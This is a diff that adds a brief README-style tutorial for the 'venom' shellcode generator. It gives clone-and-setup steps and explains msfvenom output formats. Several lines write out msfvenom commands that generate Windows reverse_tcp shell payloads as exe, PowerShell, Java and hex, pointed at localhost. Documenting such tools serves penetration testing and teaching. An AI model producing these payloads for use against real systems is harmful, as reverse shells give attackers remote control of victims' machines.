@@ -1,0 +1,31 @@
+git clone https://github.com/r00t-3xp10it/venom && cd venom
+cd aux
+./setup.sh
+cd ..
+./venom.sh
+
+Updates:
+git pull origin master
+
+[ HOW DOES MSFVENOM ACTUALLY BUILDS SHELLCODE? ]
+The default way to generate a windows binarie payload (.exe) using msfvenom its achieved through -f flag (Output format)
+msfvenom -p payload-name LHOST=127.0.0.1 LPORT=666 -f exe -o payload.exe
+
+But msfvenom allow us to build shellcode in diferent formats
+like: asp, aspx, aspx-exe, dll, elf, exe, exe-small, hta-psh
+macho, osx-app, psh, vba, vba-exe, vba-psh, vbs, bash, c
+java, perl, powershell, python, ruby, sh, vbscript.
+The complete list can be accessed using the follow command: sudo msfvenom --help-formats
+
+now lets generate a simple shellcode to windows/shell/reverse_tcp
+chosing powershell as output format "note that we will not use
+the flag -o (Save the payload) option, this way the shellcode
+generated will only displays in current terminal windows".
+Using powershell as output format:
+msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f powershell
+
+Using java as output format:
+msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f java
+
+Using hex as output format:
+msfvenom -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=666 -f hex
